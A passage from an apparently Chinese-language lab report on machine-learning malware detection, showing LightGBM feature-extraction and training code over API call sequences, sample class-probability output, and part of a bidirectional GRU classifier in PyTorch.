class="line">            train_data[&#x27;label&#x27;] = train_data[&#x27;label&#x27;].map(self.label_map)</span><br><span class="line"></span><br><span class="line">        if test_data is not None and &#x27;label&#x27; in test_data.columns:</span><br><span class="line">            test_data[&#x27;label&#x27;] = test_data[&#x27;label&#x27;].map(self.label_map)</span><br><span class="line"></span><br><span class="line">        return train_data, test_data</span><br><span class="line"></span><br><span class="line">    def prepare_features(self, train_data=None, test_data=None):</span><br><span class="line">        &quot;&quot;&quot;准备所有特征&quot;&quot;&quot;</span><br><span class="line">        print(&quot;编码标签...&quot;)</span><br><span class="line">        train_data, test_data = self._encode_labels(train_data, test_data)</span><br><span class="line"></span><br><span class="line">        if train_data is not None:</span><br><span class="line">            print(&quot;提取基础统计特征...&quot;)</span><br><span class="line">            train_stats = self._extract_basic_stats(train_data)</span><br><span class="line">            print(&quot;提取TF-IDF特征...&quot;)</span><br><span class="line">            if test_data is not None:</span><br><span class="line">                train_tfidf, test_tfidf = self._extract_tfidf_features(train_data, test_data)</span><br><span class="line">                test_stats = self._extract_basic_stats(test_data)</span><br><span class="line">                train_features = pd.merge(train_stats, train_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line">                test_features = pd.merge(test_stats, test_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line">                return train_features, test_features</span><br><span class="line">            else:</span><br><span class="line">                train_tfidf = self._extract_tfidf_features(train_data)</span><br><span class="line">                return pd.merge(train_stats, train_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line">        elif test_data is not None:</span><br><span class="line">            print(&quot;提取基础统计特征...&quot;)</span><br><span class="line">            test_stats = self._extract_basic_stats(test_data)</span><br><span class="line">            print(&quot;提取TF-IDF特征...&quot;)</span><br><span class="line">            test_tfidf = self._extract_tfidf_features(test_data)</span><br><span class="line">            return pd.merge(test_stats, test_tfidf, on=&#x27;file_id&#x27;)</span><br><span class="line"></span><br><span class="line">    def _extract_basic_stats(self, data):</span><br><span class="line">        &quot;&quot;&quot;提取基础统计特征&quot;&quot;&quot;</span><br><span class="line">        if &#x27;label&#x27; in data.columns:</span><br><span class="line">            df = data.groupby(&#x27;file_id&#x27;)[&#x27;label&#x27;].first().reset_index()</span><br><span class="line">        else:</span><br><span class="line">            df = pd.DataFrame(&#123;&#x27;file_id&#x27;: data[&#x27;file_id&#x27;].unique()&#125;)</span><br><span class="line"></span><br><span class="line">        print(&quot;计算基础聚合特征...&quot;)</span><br><span class="line">        agg_features = data.groupby(&#x27;file_id&#x27;).agg(&#123;</span><br><span class="line">            &#x27;api&#x27;: [&#x27;count&#x27;, &#x27;nunique&#x27;],</span><br><span class="line">            &#x27;tid&#x27;: &#x27;nunique&#x27;,</span><br><span class="line">            &#x27;index&#x27;: [&#x27;min&#x27;, &#x27;max&#x27;, &#x27;mean&#x27;, &#x27;std&#x27;]</span><br><span class="line">        &#125;).reset_index()</span><br><span class="line">        agg_features.columns = [&#x27;file_id&#x27;, &#x27;api_calls&#x27;, &#x27;unique_apis&#x27;,</span><br><span class="line">                                &#x27;thread_count&#x27;, &#x27;min_index&#x27;, &#x27;max_index&#x27;,</span><br><span class="line">                                &#x27;mean_index&#x27;, &#x27;std_index&#x27;]</span><br><span class="line"></span><br><span class="line">        df = pd.merge(df, agg_features, on=&#x27;file_id&#x27;, how=&#x27;left&#x27;)</span><br><span class="line"></span><br><span class="line">        print(&quot;计算API序列特征...&quot;)</span><br><span class="line">        api_counts = data.groupby([&#x27;file_id&#x27;, &#x27;api&#x27;]).size().reset_index(name=&#x27;api_freq&#x27;)</span><br><span class="line">        top_apis = api_counts.groupby(&#x27;file_id&#x27;)[&#x27;api_freq&#x27;].agg([&#x27;max&#x27;, &#x27;mean&#x27;]).reset_index()</span><br><span class="line">        top_apis.columns = [&#x27;file_id&#x27;, &#x27;max_api_freq&#x27;, &#x27;mean_api_freq&#x27;]</span><br><span class="line"></span><br><span class="line">        df = pd.merge(df, top_apis, on=&#x27;file_id&#x27;, how=&#x27;left&#x27;)</span><br><span class="line"></span><br><span class="line">        print(&quot;计算线程特征...&quot;)</span><br><span class="line">        thread_stats = data.groupby([&#x27;file_id&#x27;, &#x27;tid&#x27;]).size().reset_index(name=&#x27;apis_per_thread&#x27;)</span><br><span class="line">        thread_agg = thread_stats.groupby(&#x27;file_id&#x27;)[&#x27;apis_per_thread&#x27;].agg([&#x27;mean&#x27;, &#x27;std&#x27;, &#x27;max&#x27;]).reset_index()</span><br><span class="line">        thread_agg.columns = [&#x27;file_id&#x27;, &#x27;mean_apis_per_thread&#x27;, &#x27;std_apis_per_thread&#x27;, &#x27;max_apis_per_thread&#x27;]</span><br><span class="line"></span><br><span class="line">        df = pd.merge(df, thread_agg, on=&#x27;file_id&#x27;, how=&#x27;left&#x27;)</span><br><span class="line"></span><br><span class="line">        df[&#x27;unique_api_ratio&#x27;] = df[&#x27;unique_apis&#x27;] / (df[&#x27;api_calls&#x27;] + 1)</span><br><span class="line">        df[&#x27;api_per_thread_ratio&#x27;] = df[&#x27;api_calls&#x27;] / (df[&#x27;thread_count&#x27;] + 1)</span><br><span class="line"></span><br><span class="line">        df = df.fillna(0)</span><br><span class="line">        return df</span><br><span class="line"></span><br><span class="line">    def _extract_tfidf_features(self, train_data, test_data=None):</span><br><span class="line">        def prepare_api_sequence(data):</span><br><span class="line">            return data.groupby(&#x27;file_id&#x27;).agg(&#123;</span><br><span class="line">                &#x27;api&#x27;: lambda x: &#x27; &#x27;.join(x.astype(str))</span><br><span class="line">            &#125;).reset_index().rename(columns=&#123;&#x27;api&#x27;: &#x27;api_sequence&#x27;&#125;)</span><br><span class="line"></span><br><span class="line">        print(&quot;准备API序列...&quot;)</span><br><span class="line">        train_sequences = prepare_api_sequence(train_data)</span><br><span class="line"></span><br><span class="line">        if self.tfidf is None:</span><br><span class="line">            print(&quot;训练TF-IDF向量化器...&quot;)</span><br><span class="line">            self.tfidf = TfidfVectorizer(</span><br><span class="line">                max_features=1000,</span><br><span class="line">                ngram_range=(1, 2),</span><br><span class="line">                min_df=5,</span><br><span class="line">                dtype=np.float32,</span><br><span class="line">                token_pattern=r&#x27;(?u)\b\w+\b&#x27;</span><br><span class="line">            )</span><br><span class="line">            tfidf_features = self.tfidf.fit_transform(train_sequences[&#x27;api_sequence&#x27;])</span><br><span class="line">        else:</span><br><span class="line">            tfidf_features = self.tfidf.transform(train_sequences[&#x27;api_sequence&#x27;])</span><br><span class="line"></span><br><span class="line">        feature_names = [f&#x27;tfidf_&#123;i&#125;&#x27; for i in range(tfidf_features.shape[1])]</span><br><span class="line">        tfidf_df = pd.DataFrame(</span><br><span class="line">            tfidf_features.toarray(),</span><br><span class="line">            columns=feature_names,</span><br><span class="line">            dtype=np.float32</span><br><span class="line">        )</span><br><span class="line">        tfidf_df[&#x27;file_id&#x27;] = train_sequences[&#x27;file_id&#x27;].values</span><br><span class="line"></span><br><span class="line">        if test_data is not None:</span><br><span class="line">            print(&quot;处理测试数据TF-IDF特征...&quot;)</span><br><span class="line">            test_sequences = prepare_api_sequence(test_data)</span><br><span class="line">            test_features = self.tfidf.transform(test_sequences[&#x27;api_sequence&#x27;])</span><br><span class="line">            test_tfidf_df = pd.DataFrame(</span><br><span class="line">                test_features.toarray(),</span><br><span class="line">                columns=feature_names,</span><br><span class="line">                dtype=np.float32</span><br><span class="line">            )</span><br><span class="line">            test_tfidf_df[&#x27;file_id&#x27;] = test_sequences[&#x27;file_id&#x27;].values</span><br><span class="line">            return tfidf_df, test_tfidf_df</span><br><span class="line"></span><br><span class="line">        return tfidf_df</span><br><span class="line"></span><br><span class="line">    def train(self, train_data, n_folds=5):</span><br><span class="line">        print(&quot;准备训练数据...&quot;)</span><br><span class="line">        train_features = self.prepare_features(train_data)</span><br><span class="line"></span><br><span class="line">        X = train_features.drop([&#x27;file_id&#x27;, &#x27;label&#x27;], axis=1)</span><br><span class="line">        y = train_features[&#x27;label&#x27;]</span><br><span class="line"></span><br><span class="line">        num_classes = len(y.unique())</span><br><span class="line"></span><br><span class="line">        params = &#123;</span><br><span class="line">            &#x27;objective&#x27;: &#x27;multiclass&#x27;,</span><br><span class="line">            &#x27;num_class&#x27;: num_classes,</span><br><span class="line">            &#x27;metric&#x27;: &#x27;multi_logloss&#x27;,</span><br><span class="line">            &#x27;boosting_type&#x27;: &#x27;gbdt&#x27;,</span><br><span class="line">            &#x27;num_leaves&#x27;: 31,</span><br><span class="line">            &#x27;learning_rate&#x27;: 0.05,</span><br><span class="line">            &#x27;feature_fraction&#x27;: 0.9,</span><br><span class="line">            &#x27;bagging_fraction&#x27;: 0.8,</span><br><span class="line">            &#x27;bagging_freq&#x27;: 5,</span><br><span class="line">            &#x27;verbose&#x27;: -1,</span><br><span class="line">            &#x27;max_bin&#x27;: 63,</span><br><span class="line">            &#x27;min_data_in_leaf&#x27;: 50,</span><br><span class="line">            &#x27;num_threads&#x27;: 8</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if self.use_gpu:</span><br><span class="line">            gpu_params = &#123;</span><br><span class="line">                &#x27;device&#x27;: &#x27;gpu&#x27;,</span><br><span class="line">                &#x27;gpu_platform_id&#x27;: 0,</span><br><span class="line">                &#x27;gpu_device_id&#x27;: 0,</span><br><span class="line">                &#x27;device_type&#x27;: &#x27;cuda&#x27;,</span><br><span class="line">                &#x27;tree_learner&#x27;: &#x27;feature&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">            params.update(gpu_params)</span><br><span class="line"></span><br><span class="line">        kf = StratifiedKFold(n_splits=n_folds, shuffle=True, random_state=42)</span><br><span class="line">        self.models = []</span><br><span class="line">        self.feature_importances = pd.DataFrame()</span><br><span class="line">        validation_accuracies = []</span><br><span class="line"></span><br><span class="line">        print(f&quot;开始&#123;n_folds&#125;折交叉验证训练...&quot;)</span><br><span class="line">        for fold, (train_idx, val_idx) in enumerate(kf.split(X, y), 1):</span><br><span class="line">            print(f&quot;\n训练折数 &#123;fold&#125;/&#123;n_folds&#125;&quot;)</span><br><span class="line">            X_train, X_val = X.iloc[train_idx], X.iloc[val_idx]</span><br><span class="line">            y_train, y_val = y.iloc[train_idx], y.iloc[val_idx]</span><br><span class="line"></span><br><span class="line">            train_data = lgb.Dataset(X_train, y_train)</span><br><span class="line">            valid_data = lgb.Dataset(X_val, y_val, reference=train_data)</span><br><span class="line"></span><br><span class="line">            model = lgb.train(</span><br><span class="line">                params,</span><br><span class="line">                train_data,</span><br><span class="line">                num_boost_round=1000,</span><br><span class="line">                valid_sets=[valid_data],</span><br><span class="line">                callbacks=[</span><br><span class="line">                    lgb.early_stopping(50),</span><br><span class="line">                    lgb.log_evaluation(100)</span><br><span class="line">                ]</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">            self.models.append(model)</span><br><span class="line"></span><br><span class="line">            fold_importance = pd.DataFrame(&#123;</span><br><span class="line">                &#x27;feature&#x27;: X.columns,</span><br><span class="line">                f&#x27;importance_fold_&#123;fold&#125;&#x27;: model.feature_importance()</span><br><span class="line">            &#125;)</span><br><span class="line">            self.feature_importances = pd.concat([</span><br><span class="line">                self.feature_importances,</span><br><span class="line">                fold_importance</span><br><span class="line">            ], axis=1)</span><br><span class="line"></span><br><span class="line">            val_preds = model.predict(X_val)</span><br><span class="line">            val_preds = np.argmax(val_preds, axis=1)</span><br><span class="line">            val_accuracy = accuracy_score(y_val, val_preds)</span><br><span class="line">            validation_accuracies.append(val_accuracy)</span><br><span class="line">            print(f&quot;Fold &#123;fold&#125; 验证集准确率: &#123;val_accuracy:.4f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">        mean_accuracy = np.mean(validation_accuracies)</span><br><span class="line">        print(f&quot;\n平均验证集准确率: &#123;mean_accuracy:.4f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    def predict(self, test_data):</span><br><span class="line">        print(&quot;准备测试数据...&quot;)</span><br><span class="line">        test_features = self.prepare_features(test_data=test_data)</span><br><span class="line"></span><br><span class="line">        print(&quot;生成预测...&quot;)</span><br><span class="line">        X_test = test_features.drop([&#x27;file_id&#x27;], axis=1)</span><br><span class="line"></span><br><span class="line">        predictions = np.zeros((len(X_test), len(self.label_map)), dtype=np.float32)</span><br><span class="line">        for model in self.models:</span><br><span class="line">            predictions += model.predict(X_test)</span><br><span class="line">        predictions /= len(self.models)</span><br><span class="line"></span><br><span class="line">        submission = pd.DataFrame(&#123;</span><br><span class="line">            &#x27;file_id&#x27;: test_features[&#x27;file_id&#x27;]</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        for i, label in enumerate(sorted(self.label_map.keys())):</span><br><span class="line">            submission[f&#x27;prob_&#123;label&#125;&#x27;] = predictions[:, i]</span><br><span class="line"></span><br><span class="line">        return submission</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def load_data_in_chunks(train_path, test_path, chunk_size=1000000):</span><br><span class="line">    print(&quot;读取训练数据...&quot;)</span><br><span class="line">    train_chunks = pd.read_csv(train_path, chunksize=chunk_size)</span><br><span class="line">    train_data = pd.concat(train_chunks)</span><br><span class="line"></span><br><span class="line">    print(&quot;读取测试数据...&quot;)</span><br><span class="line">    test_chunks = pd.read_csv(test_path, chunksize=chunk_size)</span><br><span class="line">    test_data = pd.concat(test_chunks)</span><br><span class="line"></span><br><span class="line">    train_data = optimize_dtypes(train_data)</span><br><span class="line">    test_data = optimize_dtypes(test_data)</span><br><span class="line"></span><br><span class="line">    print(f&quot;训练数据形状: &#123;train_data.shape&#125;&quot;)</span><br><span class="line">    print(f&quot;测试数据形状: &#123;test_data.shape&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    return train_data, test_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    print(&quot;检查GPU状态...&quot;)</span><br><span class="line">    gpu_available = check_gpu()</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        train_data, test_data = load_data_in_chunks(</span><br><span class="line">            &#x27;input/train.csv&#x27;,</span><br><span class="line">            &#x27;input/test.csv&#x27;</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">        classifier = MalwareClassifier(use_gpu=gpu_available)</span><br><span class="line"></span><br><span class="line">        classifier.train(train_data, n_folds=5)</span><br><span class="line"></span><br><span class="line">        print(&quot;生成预测结果...&quot;)</span><br><span class="line">        submission = classifier.predict(test_data)</span><br><span class="line"></span><br><span class="line">        print(&quot;保存预测结果...&quot;)</span><br><span class="line">        submission.to_csv(&#x27;submission.csv&#x27;, index=False)</span><br><span class="line"></span><br><span class="line">        if classifier.feature_importances is not None:</span><br><span class="line">            classifier.feature_importances.to_csv(&#x27;feature_importances.csv&#x27;, index=False)</span><br><span class="line"></span><br><span class="line">        print(&quot;完成!&quot;)</span><br><span class="line"></span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(f&quot;发生错误: &#123;str(e)&#125;&quot;)</span><br><span class="line">        import traceback</span><br><span class="line">        traceback.print_exc()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ol>
<li>结果展示</li>
</ol>
<img src="/2024/12/13/%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%EF%BC%9A%E5%9F%BA%E4%BA%8E%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E3%80%81%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%92%8C%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E7%9A%84%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20241213004238784.png" class="" title="image-20241213004238784">
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">file_id,prob_0,prob_1,prob_2,prob_3,prob_4,prob_5,prob_6,prob_7</span><br><span class="line">1,0.0024434612,0.00034864913,0.9696685,0.0078575,0.00039957318,0.002738173,0.0044820085,0.012062186</span><br><span class="line">2,0.7480677,0.0013819844,0.0049213427,0.003764731,0.0005452622,0.045439627,0.017060611,0.17881876</span><br><span class="line">3,0.99866915,2.787807e-05,0.00014846055,0.00011570427,5.9706535e-06,0.00043032583,6.843034e-05,0.00053410063</span><br><span class="line">4,0.051594943,0.0038525928,0.035013992,0.065091416,0.0038617428,0.044863444,0.22614911,0.5695728</span><br><span class="line">5,0.9948373,0.00013502031,0.0009673423,0.0006626427,2.3118486e-05,0.0015179071,0.00018578261,0.0016709866</span><br><span class="line">6,0.002266401,0.00025418383,0.006541302,0.0007698187,3.052294e-05,0.98704815,0.00070866174,0.0023810265</span><br><span class="line">7,0.0043757814,0.00055977836,0.0015399179,0.70781934,0.002132857,0.025764057,0.0015818799,0.2562264</span><br><span class="line">8,0.93392134,0.0009572902,0.0076661445,0.0061014136,0.00012724655,0.016519673,0.003812942,0.030893898</span><br><span class="line">9,0.85189515,0.0010084683,0.0036384996,0.0051778518,0.00022519422,0.07421501,0.014758055,0.04908181</span><br><span class="line">10,0.37684268,0.006323976,0.20794848,0.0114947595,0.00050486217,0.12723994,0.03782148,0.23182385</span><br><span class="line">11,0.0064604813,0.0006989088,0.0032121348,0.0008223769,5.8260433e-05,0.9772016,0.0031507823,0.008395462</span><br><span class="line">12,0.9656893,0.0048273774,0.009747942,0.001571597,4.1226842e-05,0.0074556046,0.000666464,0.010000597</span><br><span class="line">13,0.9976041,5.375104e-05,0.00030956598,0.00024548933,1.8375762e-05,0.0011245721,9.734804e-05,0.00054680154</span><br><span class="line">14,0.9703827,0.00031270864,0.01056415,0.008323639,0.00010526275,0.0041897697,0.00083469774,0.0052871224</span><br><span class="line">15,0.9724293,0.0001765955,0.020143056,0.0005281937,5.2647345e-05,0.0018647272,0.00078569603,0.004019852</span><br><span class="line">16,0.99562645,7.9901416e-05,0.00037493333,0.00046305108,1.6109376e-05,0.0015119539,0.00081107346,0.0011165042</span><br><span class="line">17,0.001069112,0.00026497667,0.004910701,0.0060763317,0.00013840488,0.96927947,0.0017614173,0.016499612</span><br><span class="line">18,0.986684,0.00047525796,0.0021059073,0.0008186839,3.3282307e-05,0.004973329,0.0010258693,0.0038835872</span><br><span class="line">19,0.9890321,0.00015959739,0.002707534,0.0009250467,5.465704e-05,0.0030247762,0.00037867084,0.0037176465</span><br></pre></td></tr></table></figure>
.png)

#### 第三部分：基于深度学习的恶意程序检测与分类

##### **实验方法**

1. 特征：
   - 使用API调用序列直接作为输入。
2. 模型结构：
   - 基于双向GRU的深度学习模型。
   - 嵌入层将API序列转换为向量，双向GRU捕获序列时序信息，全连接层输出分类结果。
3. 训练与验证：
   - 使用交叉熵损失函数，Adam优化器。
   - 保存验证集损失最小的模型。

##### **实验结果**

1. 代码实现：

   - 使用PyTorch实现深度学习模型。

2. 性能表现：

   - 最终验证集准确率达到**83.66%**。
   - 模型在20个epoch中逐步收敛，训练准确率从初始的42.72%提升至84.67%。
   - 验证集损失显著降低，证明模型具有良好的泛化能力。

   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import numpy as np</span><br><span class="line">import pandas as pd</span><br><span class="line">import torch</span><br><span class="line">import torch.nn as nn</span><br><span class="line">import torch.optim as optim</span><br><span class="line">from torch.utils.data import DataLoader, Dataset</span><br><span class="line">from sklearn.preprocessing import LabelEncoder</span><br><span class="line">from sklearn.model_selection import train_test_split</span><br><span class="line">from tqdm import tqdm</span><br><span class="line"></span><br><span class="line"># 设置随机种子和设备</span><br><span class="line">SEED = 42</span><br><span class="line">np.random.seed(SEED)</span><br><span class="line">torch.manual_seed(SEED)</span><br><span class="line">DEVICE = torch.device(&quot;cuda&quot; if torch.cuda.is_available() else &quot;cpu&quot;)</span><br><span class="line">print(f&quot;Using device: &#123;DEVICE&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 加载数据</span><br><span class="line">train_data = pd.read_csv(&#x27;input/train.csv&#x27;)</span><br><span class="line">test_data = pd.read_csv(&#x27;input/test.csv&#x27;)</span><br><span class="line"></span><br><span class="line"># 编码API</span><br><span class="line">apis = list(set(list(train_data.api.unique()) + list(test_data.api.unique())))</span><br><span class="line">enc = LabelEncoder().fit(apis)</span><br><span class="line">train_data[&#x27;enc&#x27;] = enc.transform(train_data.api)</span><br><span class="line">test_data[&#x27;enc&#x27;] = enc.transform(test_data.api)</span><br><span class="line"></span><br><span class="line"># 聚合每个文件的API序列</span><br><span class="line">tr = train_data.groupby(&#x27;file_id&#x27;).enc.apply(list).reset_index()</span><br><span class="line">te = test_data.groupby(&#x27;file_id&#x27;).enc.apply(list).reset_index()</span><br><span class="line"></span><br><span class="line"># 提取标签</span><br><span class="line">label = train_data.groupby(&#x27;file_id&#x27;)[&#x27;label&#x27;].agg(&#x27;first&#x27;).reset_index()</span><br><span class="line">num_classes = label.label.nunique()</span><br><span class="line">label_encoder = LabelEncoder()</span><br><span class="line">label[&#x27;label&#x27;] = label_encoder.fit_transform(label[&#x27;label&#x27;])</span><br><span class="line"></span><br><span class="line"># 填充序列</span><br><span class="line">MAX_SEQ_LEN = 5000</span><br><span class="line">tr[&#x27;enc&#x27;] = tr[&#x27;enc&#x27;].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] * (MAX_SEQ_LEN - len(x)))</span><br><span class="line">te[&#x27;enc&#x27;] = te[&#x27;enc&#x27;].apply(lambda x: x[:MAX_SEQ_LEN] if len(x) &gt; MAX_SEQ_LEN else x + [0] * (MAX_SEQ_LEN - len(x)))</span><br><span class="line"></span><br><span class="line"># 转换为 PyTorch Dataset</span><br><span class="line">class VirusDataset(Dataset):</span><br><span class="line">    def __init__(self, sequences, labels=None):</span><br><span class="line">        self.sequences = torch.tensor(sequences, dtype=torch.long)</span><br><span class="line">        self.labels = torch.tensor(labels, dtype=torch.long) if labels is not None else None</span><br><span class="line"></span><br><span class="line">    def __len__(self):</span><br><span class="line">        return len(self.sequences)</span><br><span class="line"></span><br><span class="line">    def __getitem__(self, idx):</span><br><span class="line">        if self.labels is not None:</span><br><span class="line">            return self.sequences[idx], self.labels[idx]</span><br><span class="line">        else:</span><br><span class="line">            return self.sequences[idx]</span><br><span class="line"></span><br><span class="line"># 创建数据集</span><br><span class="line">X_train, X_val, y_train, y_val = train_test_split(tr[&#x27;enc&#x27;].tolist(), label[&#x27;label&#x27;].tolist(), test_size=0.2, random_state=SEED)</span><br><span class="line">train_dataset = VirusDataset(X_train, y_train)</span><br><span class="line">val_dataset = VirusDataset(X_val, y_val)</span><br><span class="line">test_dataset = VirusDataset(te[&#x27;enc&#x27;].tolist())</span><br><span class="line"></span><br><span class="line"># 数据加载器</span><br><span class="line">BATCH_SIZE = 256</span><br><span class="line">train_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)</span><br><span class="line">val_loader = DataLoader(val_dataset, batch_size=BATCH_SIZE, shuffle=False)</span><br><span class="line">test_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE, shuffle=False)</span><br><span class="line"></span><br><span class="line"># 模型定义</span><br><span class="line">class GRUModel(nn.Module):</span><br><span class="line">    def __init__(self, vocab_size, embed_dim, hidden_dim, num_classes):</span><br><span class="line">        super(GRUModel, self).__init__()</span><br><span class="line">        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)</span><br><span class="line">        self.gru = nn.GRU(embed_dim, hidden_dim, batch_first=True, bidirectional=True)</span><br><span class="line">        self.fc = nn.Linear(hidden_dim * 2, num_classes)</span><br><span class="line">        self.dropout = nn.Dropout(0.3)</span><br><span class="line"></span><br><span class="line">    def forward(self, x):</span><br><span class="line">        x = self.embedding(x)  # x shape: (batch_size, seq_len, embed_dim)</span><br><span class="line">        x, _ = self.gru(x)     # x shape: (batch_size, seq_len, hidden_dim * 2)</span><br><span class="line">        x = x[:, -1, :]         # 取最后一个时间步的输出 (batch_size, hidden_dim * 2)</span><br><span class="line">        x = self.dropout(x)</span><br><span class="line">        x = self.fc(x)         # x shape: (batch_size, num_classes)</span><br><span class="line">        return x</span><br><span class="line"></span><br><span class="line"># 超参数</span><br><span class="line">VOCAB_SIZE = len(apis) + 1</span><br><span class="line">EMBED_DIM = 50</span><br><span class="line">HIDDEN_DIM = 128</span><br><span class="line">NUM_CLASSES = num_classes</span><br><span class="line">LR = 0.001</span><br><span class="line">EPOCHS = 20</span><br><span class="line"></span><br><span class="line"># 初始化模型、损失函数和优化器</span><br><span class="line">model = GRUModel(VOCAB_SIZE, EMBED_DIM, HIDDEN_DIM, NUM_CLASSES).to(DEVICE)</span><br><span class="line">criterion = nn.CrossEntropyLoss()</span><br><span class="line">optimizer = optim.Adam(model.parameters(), lr=LR)</span><br><span class="line"></span><br><span class="line"># 检查是否存在模型文件</span><br><span class="line">MODEL_PATH = &#x27;best_gru_model.pth&#x27;</span><br><span class="line">if os.path.exists(MODEL_PATH):</span><br><span class="line">    print(f&quot;检测到已有模型文件 &#123;MODEL_PATH&#125;，直接加载模型进行预测...&quot;)</span><br><span class="line">    model.load_state_dict(torch.load(MODEL_PATH))</span><br><span class="line">else:</span><br><span class="line">    # 训练和验证函数</span><br><span class="line">    def train_epoch(model, dataloader, criterion, optimizer):</span><br><span class="line">        model.train()</span><br><span class="line">        epoch_loss, correct, total = 0, 0, 0</span><br><span class="line">        for sequences, labels in tqdm(dataloader, desc=&quot;Training&quot;):</span><br><span class="line">            sequences, labels = 